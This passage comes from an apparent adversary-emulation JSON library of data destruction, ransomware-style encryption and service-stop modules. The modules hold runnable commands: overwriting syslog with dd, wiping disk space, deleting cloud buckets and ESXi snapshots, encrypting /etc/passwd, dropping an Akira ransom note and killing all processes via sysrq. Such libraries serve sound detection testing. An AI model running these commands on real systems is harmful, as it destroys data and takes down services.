          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\..\\ExternalPayloads\\T1485.txt"
        }
      ],
      "prerequisites": [
        {
          "description": "Secure delete tool from SysInternals must exist on disk at specified location (#{sdelete_exe})\n",
          "check_command": "if (Test-Path \"#{sdelete_exe}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://download.sysinternals.com/files/SDelete.zip\" -OutFile \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\SDelete.zip\"\nExpand-Archive \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\SDelete.zip\" \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\Sdelete\" -Force\nRemove-Item \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\SDelete.zip\" -Force\n"
        }
      ],
      "rx_module_id": "476419b5-aebf-4366-a131-ae3e8dae5fc2",
      "module_name": "Windows - Overwrite file with SysInternals SDelete"
    },
    {
      "index": 1094,
      "technique_id": "T1485",
      "technique_name": "Data Destruction",
      "description": "Overwrites and deletes a file using DD.\nTo stop the test, break the command with CTRL/CMD+C.\n",
      "execution": {
        "platforms": [
          "linux",
          "macos"
        ],
        "executor_type": "sh",
        "command": "dd of=#{file_to_overwrite} if=#{overwrite_source} count=$(ls -l #{file_to_overwrite} | awk '{print $5}') iflag=count_bytes\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "overwrite_source",
          "description": "Path of data source to overwrite with",
          "type": "path",
          "default_value": "/dev/zero"
        },
        {
          "name": "file_to_overwrite",
          "description": "Path of file to overwrite and remove",
          "type": "path",
          "default_value": "/var/log/syslog"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "38deee99-fd65-4031-bec8-bfa4f9f26146",
      "module_name": "FreeBSD/macOS/Linux - Overwrite file with DD"
    },
    {
      "index": 1095,
      "technique_id": "T1485",
      "technique_name": "Data Destruction",
      "description": "RansomEXX malware removes all deleted files using windows built-in cipher.exe to prevent forensic recover.\nThis process is very slow and test execution may timeout. \nhttps://www.cybereason.com/blog/cybereason-vs.-ransomexx-ransomware\nhttps://support.microsoft.com/en-us/topic/cipher-exe-security-tool-for-the-encrypting-file-system-56c85edd-85cf-ac07-f2f7-ca2d35dab7e4\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "cipher.exe /w:C:\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "321fd25e-0007-417f-adec-33232252be19",
      "module_name": "Overwrite deleted data on C drive"
    },
    {
      "index": 1096,
      "technique_id": "T1485",
      "technique_name": "Data Destruction",
      "description": "This RAGLOX will create a Google Storage Bucket then delete it. The idea for this RAGLOX came from a Rule published by the Elastic team.\n\nIdentifies when a Google Cloud Platform (GCP) storage bucket is deleted. An adversary may delete a storage bucket in order to disrupt their target's business operations.\nThis raglox will create a bucket then delete the bucket.\n\nReference: https://github.com/elastic/detection-rules/blob/main/rules/integrations/gcp/impact_gcp_storage_bucket_deleted.toml\n",
      "execution": {
        "platforms": [
          "iaas:gcp"
        ],
        "executor_type": "sh",
        "command": "gcloud config set project #{project_id}\ngcloud storage buckets delete gs://#{bucket_name}\n",
        "elevation_required": false,
        "cleanup_command": "cd \"$PathToRagloxModulesFolder/T1485/src/T1485-4/\"\nterraform state rm google_storage_bucket.bucket\nterraform destroy -auto-approve\n"
      },
      "variables": [
        {
          "name": "project_id",
          "description": "ID of the GCP Project you to execute the command against.",
          "type": "string",
          "default_value": "raglox-test-1"
        },
        {
          "name": "bucket_name",
          "description": "The name of the bucket to delete.",
          "type": "string",
          "default_value": "raglox-red-team-bucket"
        }
      ],
      "prerequisites": [
        {
          "description": "Requires gcloud\n",
          "check_command": "if [ -x \"$(command -v gcloud)\" ]; then exit 0; else exit 1; fi;\n",
          "install_command": "echo \"Please Install Google Cloud SDK before running this RAGLOX module : https://cloud.google.com/sdk/docs/install\"\n"
        },
        {
          "description": "Check if user is logged in \n",
          "check_command": "gcloud config get-value account\n",
          "install_command": "gcloud auth login --no-launch-browser\n"
        },
        {
          "description": "Check if terraform is installed.\n",
          "check_command": "terraform version\n",
          "install_command": "echo Please install the terraform.\n"
        },
        {
          "description": "Create dependency resources using terraform\n",
          "check_command": "stat \"$PathToRagloxModulesFolder/T1485/src/T1485-4/terraform.tfstate\"\n",
          "install_command": "cd \"$PathToRagloxModulesFolder/T1485/src/T1485-4/\"\nterraform init\nterraform apply -auto-approve\n"
        }
      ],
      "rx_module_id": "4ac71389-40f4-448a-b73f-754346b3f928",
      "module_name": "GCP - Delete Bucket"
    },
    {
      "index": 1097,
      "technique_id": "T1485",
      "technique_name": "Data Destruction",
      "description": "Deletes all snapshots for all Virtual Machines on an ESXi Host\n[Reference](https://lolesxi-project.github.io/LOLESXi/lolesxi/Binaries/vim-cmd/#inhibit%20recovery)\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "echo \"\" | \"#{plink_file}\" -batch \"#{vm_host}\" -ssh -l #{vm_user} -pw \"#{vm_pass}\" \"for i in `vim-cmd vmsvc/getallvms | awk 'NR>1 {print $1}'`; do vim-cmd vmsvc/snapshot.removeall $i & done\"\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "vm_host",
          "description": "Specify the host name or IP of the ESXi server.",
          "type": "string",
          "default_value": "raglox.local"
        },
        {
          "name": "vm_user",
          "description": "Specify the privilege user account on the ESXi server.",
          "type": "string",
          "default_value": "root"
        },
        {
          "name": "vm_pass",
          "description": "Specify the privileged user's password.",
          "type": "string",
          "default_value": "password"
        },
        {
          "name": "plink_file",
          "description": "Path to Plink",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\..\\ExternalPayloads\\plink.exe"
        }
      ],
      "prerequisites": [
        {
          "description": "Check if we have plink\n",
          "check_command": "if (Test-Path \"#{plink_file}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe\" -OutFile \"#{plink_file}\"\n"
        }
      ],
      "rx_module_id": "1207ddff-f25b-41b3-aa0e-7c26d2b546d1",
      "module_name": "ESXi - Delete VM Snapshots"
    },
    {
      "index": 1098,
      "technique_id": "T1486",
      "technique_name": "Data Encrypted for Impact",
      "description": "Uses gpg to encrypt a file\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "echo \"#{pwd_for_encrypted_file}\" | $which_gpg --batch --yes --passphrase-fd 0 --cipher-algo #{encryption_alg} -o #{encrypted_file_path} -c #{input_file_path}\n",
        "elevation_required": false,
        "cleanup_command": "rm #{encrypted_file_path}\n"
      },
      "variables": [
        {
          "name": "pwd_for_encrypted_file",
          "description": "the password that you want for the encrypted file",
          "type": "string",
          "default_value": "passwd"
        },
        {
          "name": "encrypted_file_path",
          "description": "path to the encrypted file",
          "type": "path",
          "default_value": "/tmp/passwd.gpg"
        },
        {
          "name": "input_file_path",
          "description": "path to the file that you want to encrypt",
          "type": "path",
          "default_value": "/etc/passwd"
        },
        {
          "name": "encryption_alg",
          "description": "encryption algorithm of the file",
          "type": "string",
          "default_value": "AES-256"
        }
      ],
      "prerequisites": [
        {
          "description": "Finds where gpg is located\n",
          "check_command": "which_gpg=`which gpg`\n",
          "install_command": "(which pkg && pkg install -y gnupg)||(which yum && yum -y install epel-release gpg)||(which apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y gpg)\n"
        }
      ],
      "rx_module_id": "7b8ce084-3922-4618-8d22-95f996173765",
      "module_name": "Encrypt files using gpg (FreeBSD/Linux)"
    },
    {
      "index": 1099,
      "technique_id": "T1486",
      "technique_name": "Data Encrypted for Impact",
      "description": "Uses 7z to encrypt a file\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "$which_7z a -p#{pwd_for_encrypted_file} #{encrypted_file_path} #{input_file_path}\n",
        "elevation_required": false,
        "cleanup_command": "$which_7z e #{encrypted_file_path}\nrm #{encrypted_file_path}\n"
      },
      "variables": [
        {
          "name": "pwd_for_encrypted_file",
          "description": "the password that you want for the encrypted file",
          "type": "string",
          "default_value": "passwd"
        },
        {
          "name": "encrypted_file_path",
          "description": "path to the encrypted file",
          "type": "path",
          "default_value": "/tmp/passwd.zip"
        },
        {
          "name": "input_file_path",
          "description": "path to the file that you want to encrypt",
          "type": "path",
          "default_value": "/etc/passwd"
        }
      ],
      "prerequisites": [
        {
          "description": "Finds where 7z is located\n",
          "check_command": "which_7z=`which 7z`\n",
          "install_command": "(which pkg && pkg install -y 7-zip)\n"
        }
      ],
      "rx_module_id": "53e6735a-4727-44cc-b35b-237682a151ad",
      "module_name": "Encrypt files using 7z (FreeBSD/Linux)"
    },
    {
      "index": 1100,
      "technique_id": "T1486",
      "technique_name": "Data Encrypted for Impact",
      "description": "Attempts to encrypt data on target systems as root to simulate an interruption authentication to target system. If root permissions are not available then attempts to encrypt data within user's home directory.\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "which_ccencrypt=`which ccencrypt`\ncp #{root_input_file_path} #{cped_file_path};\n$which_ccencrypt -T -K #{pwd_for_encrypted_file} #{cped_file_path}\n",
        "elevation_required": false,
        "cleanup_command": "rm #{cped_file_path}.cpt\n"
      },
      "variables": [
        {
          "name": "cped_file_path",
          "description": "Path where you want your copied file to be",
          "type": "path",
          "default_value": "/tmp/passwd"
        },
        {
          "name": "root_input_file_path",
          "description": "Path the target file to be encrypted. File will be copied to /tmp/ before encrypting",
          "type": "path",
          "default_value": "/etc/passwd"
        },
        {
          "name": "pwd_for_encrypted_file",
          "description": "Password to use for encryption",
          "type": "string",
          "default_value": "passwd"
        }
      ],
      "prerequisites": [
        {
          "description": "Finds where ccencrypt and ccdecrypt are located\n",
          "check_command": "which_ccencrypt=`which ccencrypt`\nwhich_ccdecrypt=`which ccdecrypt`\n",
          "install_command": "(which pkg && pkg install -y ccript)||(which yum && yum -y install epel-release ccrypt)||(which apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y ccrypt)\n"
        }
      ],
      "rx_module_id": "08cbf59f-85da-4369-a5f4-049cffd7709f",
      "module_name": "Encrypt files using ccrypt (FreeBSD/Linux)"
    },
    {
      "index": 1101,
      "technique_id": "T1486",
      "technique_name": "Data Encrypted for Impact",
      "description": "Uses openssl to encrypt a file\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "which_openssl=`which openssl`\n$which_openssl genrsa -out #{private_key_path} #{encryption_bit_size}\n$which_openssl rsa -in #{private_key_path} -pubout -out #{public_key_path}\n$which_openssl rsautl -encrypt -inkey #{public_key_path} -pubin -in #{input_file_path} -out #{encrypted_file_path}\n",
        "elevation_required": false,
        "cleanup_command": "$which_openssl rsautl -decrypt -inkey #{private_key_path} -in #{encrypted_file_path}\nrm #{encrypted_file_path}\n"
      },
      "variables": [
        {
          "name": "private_key_path",
          "description": "path to the private key",
          "type": "path",
          "default_value": "/tmp/key.pem"
        },
        {
          "name": "public_key_path",
          "description": "path to the public key",
          "type": "path",
          "default_value": "/tmp/pub.pem"
        },
        {
          "name": "encryption_bit_size",
          "description": "size of the bit of encryption",
          "type": "integer",
          "default_value": 2048
        },
        {
          "name": "encrypted_file_path",
          "description": "path to the encrypted file",
          "type": "path",
          "default_value": "/tmp/passwd.zip"
        },
        {
          "name": "input_file_path",
          "description": "path to the file that you want to encrypt",
          "type": "path",
          "default_value": "/etc/passwd"
        }
      ],
      "prerequisites": [
        {
          "description": "Finds where openssl is located\n",
          "check_command": "which_openssl=`which openssl`\n",
          "install_command": ""
        }
      ],
      "rx_module_id": "142752dc-ca71-443b-9359-cf6f497315f1",
      "module_name": "Encrypt files using openssl (FreeBSD/Linux)"
    },
    {
      "index": 1102,
      "technique_id": "T1486",
      "technique_name": "Data Encrypted for Impact",
      "description": "building the IOC (YOUR_FILES.txt) for the PureLocker ransomware \nhttps://www.bleepingcomputer.com/news/security/purelocker-ransomware-can-lock-files-on-windows-linux-and-macos/\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "echo T1486 - Purelocker Ransom Note > %USERPROFILE%\\Desktop\\YOUR_FILES.txt\n",
        "elevation_required": true,
        "cleanup_command": "del %USERPROFILE%\\Desktop\\YOUR_FILES.txt >nul 2>&1\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "649349c7-9abf-493b-a7a2-b1aa4d141528",
      "module_name": "PureLocker Ransom Note"
    },
    {
      "index": 1103,
      "technique_id": "T1486",
      "technique_name": "Data Encrypted for Impact",
      "description": "This test encrypts the file(s) using the 7z utility\n",
      "execution": {
        "platforms": [
          "macos"
        ],
        "executor_type": "sh",
        "command": "7z a -p #{file_password} -mhe=on #{encrypted_file_name} #{input_file_path}\n",
        "elevation_required": false,
        "cleanup_command": "rm #{encrypted_file_name}\n"
      },
      "variables": [
        {
          "name": "file_password",
          "description": "Password to be provided for archiving the file",
          "type": "string",
          "default_value": "ARTPass"
        },
        {
          "name": "encrypted_file_name",
          "description": "Name of the archive to be created",
          "type": "string",
          "default_value": "ARTArchive.7z"
        },
        {
          "name": "input_file_path",
          "description": "Path to the file that you want to encrypt",
          "type": "path",
          "default_value": "~/test.txt"
        }
      ],
      "prerequisites": [
        {
          "description": "Check if 7z command exists on the machine\n",
          "check_command": "which 7z\n",
          "install_command": "echo Installing 7z, using brew\n/bin/bash -c \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)\"\nbrew install p7zip\n"
        }
      ],
      "rx_module_id": "645f0f5a-ef09-48d8-b9bc-f0e24c642d72",
      "module_name": "Encrypt files using 7z utility - macOS"
    },
    {
      "index": 1104,
      "technique_id": "T1486",
      "technique_name": "Data Encrypted for Impact",
      "description": "This test encrypts the file(s) using the openssl utility\n",
      "execution": {
        "platforms": [
          "macos"
        ],
        "executor_type": "sh",
        "command": "openssl enc #{encryption_option} -in #{input_file_path} -out #{output_file_name}\n",
        "elevation_required": false,
        "cleanup_command": "rm #{output_file_name}\n"
      },
      "variables": [
        {
          "name": "encryption_option",
          "description": "Specifiy the required encryption option",
          "type": "string",
          "default_value": "-pbkdf2"
        },
        {
          "name": "input_file_path",
          "description": "Path to the file that you want to encrypt",
          "type": "path",
          "default_value": "~/test.txt"
        },
        {
          "name": "output_file_name",
          "description": "Path to the file that you want to encrypt",
          "type": "string",
          "default_value": "ARTFile"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "1a01f6b8-b1e8-418e-bbe3-78a6f822759e",
      "module_name": "Encrypt files using openssl utility - macOS"
    },
    {
      "index": 1105,
      "technique_id": "T1486",
      "technique_name": "Data Encrypted for Impact",
      "description": "Gpg4win is a Windows tool (also called Kleopatra which is the preferred certificate manager) that uses email and file encryption packages for symmetric encryption. It is used by attackers to encrypt disks. User will need to add pass phrase to encrypt file as automation is not allowed under newer versions.",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Set-Content -Path \"#{File_to_Encrypt_Location}\" -Value \"populating this file with some text\"  # Create the test.txt file again in case prereqs failed\ncmd /c \"`\"C:\\Program Files (x86)\\GnuPG\\bin\\gpg.exe`\" --passphrase 'SomeParaphraseBlah' --batch --yes -c `\"#{File_to_Encrypt_Location}`\"\"\n",
        "elevation_required": false,
        "cleanup_command": "Remove-Item -Path \"#{File_to_Encrypt_Location}\" -Force -ErrorAction SilentlyContinue\nRemove-Item -Path \"#{File_to_Encrypt_Location}.gpg\" -Force -ErrorAction SilentlyContinue\n"
      },
      "variables": [
        {
          "name": "GPG_Exe_Location",
          "description": "Path of the GPG program",
          "type": "path",
          "default_value": "C:\\Program Files (x86)\\GnuPG\\bin\\gpg.exe"
        },
        {
          "name": "File_to_Encrypt_Location",
          "description": "Path of File",
          "type": "path",
          "default_value": "$env:temp\\test.txt"
        }
      ],
      "prerequisites": [
        {
          "description": "GPG must exist at (#{GPG_Exe_Location}). If -GetPrereqs fails, try to install GPG4WIN manually at 'https://www.gpg4win.org/download.html'. Once done, run -CheckPrereqs to confirm that it works.\n",
          "check_command": "if (test-path '#{GPG_Exe_Location}'){exit 0} else {exit 1}\n",
          "install_command": "Set-Content -Path \"#{File_to_Encrypt_Location}\" -Value \"populating this file with some text\"  # Create the test.txt file\nNew-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\ninvoke-webrequest \"https://files.gpg4win.org/gpg4win-4.1.0.exe\" -outfile \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\gpginstall.exe\"\ncmd /c \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\gpginstall.exe\" /S\n"
        }
      ],
      "rx_module_id": "4541e2c2-33c8-44b1-be79-9161440f1718",
      "module_name": "Data Encrypted with GPG4Win"
    },
    {
      "index": 1106,
      "technique_id": "T1486",
      "technique_name": "Data Encrypted for Impact",
      "description": "DiskCryptor, an open source encryption utility, can be exploited by adversaries for encrypting all disk partitions, including system partitions. This tool was identified in a ransomware campaign, as reported on https://thedfirreport.com/2021/11/15/exchange-exploit-leads-to-domain-wide-ransomware/. The documentation for DiskCryptor can be found at https://github.com/DavidXanatos/DiskCryptor. During the installation process, running dcrypt.exe starts the encryption console. It's important to note that a system reboot is necessary as part of the installation.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "\"\"%PROGRAMFILES%\\dcrypt\"\\#{dcrypt_exe}\"\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "dcrypt_exe",
          "description": "The dcrypt.exe executable from dcrypt_setup.exe",
          "type": "path",
          "default_value": "dcrypt.exe"
        }
      ],
      "prerequisites": [
        {
          "description": "dcrypt_setup will be installed at specified location (#{dcrypt_exe})\n",
          "check_command": "if (Test-Path \"${env:ProgramFiles}/dcrypt/#{dcrypt_exe}\") {exit 0} else {exit 1}\n",
          "install_command": "Write-Host Downloading DiskCryptor installer\nNew-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://github.com/DavidXanatos/DiskCryptor/releases/download/1.1.846.118/dcrypt_setup_1.1.846.118.exe\" -OutFile      \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\dcrypt_setup_1.1.846.118.exe\"\nWrite-Host Install DiskCryptor\nStart-Process \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\dcrypt_setup_1.1.846.118.exe\" -Wait -ArgumentList \"/s\"\n"
        }
      ],
      "rx_module_id": "44b68e11-9da2-4d45-a0d9-893dabd60f30",
      "module_name": "Data Encrypt Using DiskCryptor"
    },
    {
      "index": 1107,
      "technique_id": "T1486",
      "technique_name": "Data Encrypted for Impact",
      "description": "Dropping 100 files with random content and .akira File Extension and the Akira Ransomnote to c:\\\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "1..100 | ForEach-Object { $out = new-object byte[] 1073741; (new-object Random).NextBytes($out); [IO.File]::WriteAllBytes(\"c:\\test.$_.akira\", $out) }\necho \"Hi friends\" >> $env:Userprofile\\Desktop\\akira_readme.txt\necho \"\" >> $env:Userprofile\\Desktop\\akira_readme.txt\necho \"Whatever who you are and what your title is if you' re reading this it means the internal infrastructure of your company is fully or partially dead, all your backups - virtual, physical - everything that we managed to reach - are completely removed. Moreover, we have taken a great amount of your corporate data prior to encryption  Well, for now let's keep all the tears and resentment to ourselves and try to build a constructive dialogue. We're fully aware of what damage we caused by locking your internal sources. At the moment. you have to know: \" >> $env:Userprofile\\Desktop\\akira_readme.txt\necho \"1. Dealing with us you will save A LOT due to we are not interested in ruining your financially. We will study in depth your finance, bank income statements, your savings, investments etc. and present our reasonable demand to you. If you have an active cyber insurance, let us know and we will guide you how to properly use it. Also, dragging out the negotiation process will lead to failing of a deal\" >> $env:Userprofile\\Desktop\\akira_readme.txt\necho \"2. Paying us you save your TIME, MONEY, EFFORTS and be back on track within 24 hours approximately. Our decryptor works properly on any files or systems, so you will be able to check it by requesting a test decryption service from the beginning of our conversation. [f you decide to recover on your own, keep in mind that you can permanently lose access to some files or accidently corrupt them  in this case we won't be able to help.  \" >> $env:Userprofile\\Desktop\\akira_readme.txt\necho \"3. The security report or the exclusive first-hand information that you will receive upon reaching an agreement is of a great value, since NO full audit of your network will show you the vulnerabilities that we' ve managed to detect and used in order to get into. identify backup solutions and upload your data.\" >> $env:Userprofile\\Desktop\\akira_readme.txt\necho \"4. As for your data, if we fail to agree, we will try to sell personal information/trade secrets/databases/source codes  generally speaking, everything that has a value on the darkmarket - to multiple threat actors at ones.\" >> $env:Userprofile\\Desktop\\akira_readme.txt\necho \"Then all of this will be published in our blog -\" >> $env:Userprofile\\Desktop\\akira_readme.txt\necho \"\" >> $env:Userprofile\\Desktop\\akira_readme.txt\necho \"https://akira.onion\" >> $env:Userprofile\\Desktop\\akira_readme.txt\necho \"\" >> $env:Userprofile\\Desktop\\akira_readme.txt\necho \"5. We're more than negotiable and will definitely find the way to settle this quickly and reach an agreement which will satisfy both of us\" >> $env:Userprofile\\Desktop\\akira_readme.txt\necho \"\" >> $env:Userprofile\\Desktop\\akira_readme.txt\necho \"If you' re indeed interested in our assistance and the services we provide you can reach out to us following simple instructions:\" >> $env:Userprofile\\Desktop\\akira_readme.txt\necho \"\" >> $env:Userprofile\\Desktop\\akira_readme.txt\necho \"1. Install TOR Browser to get access to our chat room - https://www.torproject.org/download/.\" >> $env:Userprofile\\Desktop\\akira_readme.txt\necho \"2. Paste this link - https://akira.onion\" >> $env:Userprofile\\Desktop\\akira_readme.txt\necho \"3. Use this code - - to log into our chat.\" >> $env:Userprofile\\Desktop\\akira_readme.txt\necho \"\" >> $env:Userprofile\\Desktop\\akira_readme.txt\necho \"Keep in mind that the faster you will get in touch, the less damage we cause\" >> $env:Userprofile\\Desktop\\akira_readme.txt\n",
        "elevation_required": true,
        "cleanup_command": "del $env:Userprofile\\Desktop\\akira_readme.txt \ndel c:\\test.*.akira\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "ab3f793f-2dcc-4da5-9c71-34988307263f",
      "module_name": "Akira Ransomware drop Files with .akira Extension and Ransomnote"
    },
    {
      "index": 1108,
      "technique_id": "T1489",
      "technique_name": "Service Stop",
      "description": "Stops a specified service using the sc.exe command. Upon execution, if the spooler service was running infomration will be displayed saying\nit has changed to a state of STOP_PENDING. If the spooler service was not running \"The service has not been started.\" will be displayed and it can be\nstarted by running the cleanup command.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "sc.exe stop #{service_name}\n",
        "elevation_required": true,
        "cleanup_command": "sc.exe start #{service_name} >nul 2>&1\n"
      },
      "variables": [
        {
          "name": "service_name",
          "description": "Name of a service to stop",
          "type": "string",
          "default_value": "spooler"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "21dfb440-830d-4c86-a3e5-2a491d5a8d04",
      "module_name": "Windows - Stop service using Service Controller"
    },
    {
      "index": 1109,
      "technique_id": "T1489",
      "technique_name": "Service Stop",
      "description": "Stops a specified service using the net.exe command. Upon execution, if the service was running \"The Print Spooler service was stopped successfully.\"\nwill be displayed. If the service was not running, \"The Print Spooler service is not started.\" will be displayed and it can be\nstarted by running the cleanup command.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "net.exe stop #{service_name}\n",
        "elevation_required": true,
        "cleanup_command": "net.exe start #{service_name} >nul 2>&1\n"
      },
      "variables": [
        {
          "name": "service_name",
          "description": "Name of a service to stop",
          "type": "string",
          "default_value": "spooler"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "41274289-ec9c-4213-bea4-e43c4aa57954",
      "module_name": "Windows - Stop service using net.exe"
    },
    {
      "index": 1110,
      "technique_id": "T1489",
      "technique_name": "Service Stop",
      "description": "Stops a specified service killng the service's process.\nThis technique was used by WannaCry. Upon execution, if the spoolsv service was running \"SUCCESS: The process \"spoolsv.exe\" with PID 2316 has been terminated.\"\nwill be displayed. If the service was not running \"ERROR: The process \"spoolsv.exe\" not found.\" will be displayed and it can be\nstarted by running the cleanup command.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "taskkill.exe /f /im #{process_name}\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "process_name",
          "description": "Name of a process to kill",
          "type": "string",
          "default_value": "spoolsv.exe"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "f3191b84-c38b-400b-867e-3a217a27795f",
      "module_name": "Windows - Stop service by killing process"
    },
    {
      "index": 1111,
      "technique_id": "T1489",
      "technique_name": "Service Stop",
      "description": "Stops a specified service using the systemctl command.\nUpon execution, if the specified service was running, it will change to a state of inactive and it can be restarted by running the cleanup command.\nYou can list all available services with following command: \"systemctl list-units --type=service\"\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "sudo systemctl stop #{service_name}\n",
        "elevation_required": true,
        "cleanup_command": "sudo systemctl start #{service_name} 2> /dev/null\n"
      },
      "variables": [
        {
          "name": "service_name",
          "description": "Name of a service to stop",
          "type": "string",
          "default_value": "cron"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "42e3a5bd-1e45-427f-aa08-2a65fa29a820",
      "module_name": "Linux - Stop service using systemctl"
    },
    {
      "index": 1112,
      "technique_id": "T1489",
      "technique_name": "Service Stop",
      "description": "Stops a specified service by sending a SIGTERM signal to the linked process using the killall command.\nUpon execution, if the service's main process was running, it will be terminated.\nIf the service was not running, no process will be found to kill and it can be restarted by running the cleanup command.\nYou can list all available services with following command: \"systemctl list-units --type=service\"\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "sudo killall -SIGTERM #{process_name}\n",
        "elevation_required": true,
        "cleanup_command": "sudo systemctl start #{service_name} 2> /dev/null\n"
      },
      "variables": [
        {
          "name": "process_name",
          "description": "Name of a process to stop",
          "type": "string",
          "default_value": "cron"
        },
        {
          "name": "service_name",
          "description": "Name of a service to restart",
          "type": "string",
          "default_value": "cron"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "e5d95be6-02ee-4ff1-aebe-cf86013b6189",
      "module_name": "Linux - Stop service by killing process using killall"
    },
    {
      "index": 1113,
      "technique_id": "T1489",
      "technique_name": "Service Stop",
      "description": "Stops a specified service by sending a SIGTERM signal to the linked process using the kill command. Upon execution, if the service's main process was running, it will be terminated.\nIf the service was not running, no process will be found to kill and it can be restarted by running the cleanup command.\nYou can list all available services with following command: \"systemctl list-units --type=service\"\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "sudo kill -SIGTERM $(pgrep #{process_name})\n",
        "elevation_required": true,
        "cleanup_command": "sudo systemctl start #{service_name} 2> /dev/null\n"
      },
      "variables": [
        {
          "name": "process_name",
          "description": "Name of a process to kill",
          "type": "string",
          "default_value": "cron"
        },
        {
          "name": "service_name",
          "description": "Name of a service to restart",
          "type": "string",
          "default_value": "cron"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "332f4c76-7e96-41a6-8cc2-7361c49db8be",
      "module_name": "Linux - Stop service by killing process using kill"
    },
    {
      "index": 1114,
      "technique_id": "T1489",
      "technique_name": "Service Stop",
      "description": "Stops a specified service by sending a SIGTERM signal to the linked process using pkill. This method is effective when multiple instances of the process may be running.\nUpon execution, if any instances of the process were running, they will be terminated. If no instances were running, pkill will not find any processes to kill.\nStopped service can be restarted by running the cleanup command.\nYou can list all available services with following command: \"systemctl list-units --type=service\"\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "sudo pkill -SIGTERM #{process_pattern}\n",
        "elevation_required": true,
        "cleanup_command": "sudo systemctl start #{service_name} 2> /dev/null\n"
      },
      "variables": [
        {
          "name": "process_pattern",
          "description": "Pattern to match the name of the process to kill",
          "type": "string",
          "default_value": "^cron$"
        },
        {
          "name": "service_name",
          "description": "Name of a service to restart",
          "type": "string",
          "default_value": "cron"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "08b4718f-a8bf-4bb5-a552-294fc5178fea",
      "module_name": "Linux - Stop service by killing process using pkill"
    },
    {
      "index": 1115,
      "technique_id": "T1489",
      "technique_name": "Service Stop",
      "description": "Adversaries with root or sufficient privileges Send a SIGTERM to all processes, except for init. By writing 'e' to /proc/sysrq-trigger, they can forced kill all processes, except for init.\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "bash",
        "command": "echo \"e\" > /proc/sysrq-trigger\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "6e76f56f-2373-4a6c-a63f-98b7b72761f1",
      "module_name": "Abuse of linux magic system request key for Send a SIGTERM to all processes"
    },
    {
      "index": 1116,
      "technique_id": "T1490",
      "technique_name": "Inhibit System Recovery",
